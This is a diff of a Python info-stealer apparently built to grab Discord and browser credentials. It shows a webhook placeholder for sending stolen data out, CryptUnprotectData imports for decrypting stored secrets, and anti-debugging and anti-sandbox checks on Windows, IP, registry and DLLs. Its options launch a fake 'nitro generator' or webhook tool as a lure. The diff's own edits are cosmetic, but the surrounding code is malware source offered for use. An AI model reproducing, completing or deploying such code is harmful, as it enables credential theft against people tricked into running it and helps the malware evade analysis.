@@ -22,7 +22,7 @@ import shutil, json, sqlite3
 from win32crypt import CryptUnprotectData
 
 ### CONFIG ### 
-webhook = '%Webhook%' #Put ur webhook
+webhook = '%Webhook%' #Put your webhook
 
 FakeWebhook = '%FakeWebhook%' # If True, starts a fake webhook tool with options to delete, spam, etc.
 Fakegen = '%FakeGen%' # If True, starts a fake Discord nitro generator
@@ -37,9 +37,6 @@ def clear_command_prompt():
         os.system('cls')
     else:
         os.system('clear')
-
-clear_command_prompt()
-
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
     for check in checks:
@@ -82,7 +79,6 @@ def check_ip():
             return
         except:
             pass
-
 def check_registry():
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
@@ -102,8 +98,7 @@ def check_dll():
 
 headers = {
         "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
 
 try:
     if antidebugging == True:
@@ -118,7 +113,6 @@ class DATA_BLOB(Structure):
         ('cbData', wintypes.DWORD),
         ('pbData', POINTER(c_char))
     ]
-
 def webhook_tools():
     try:
         time.sleep(1)
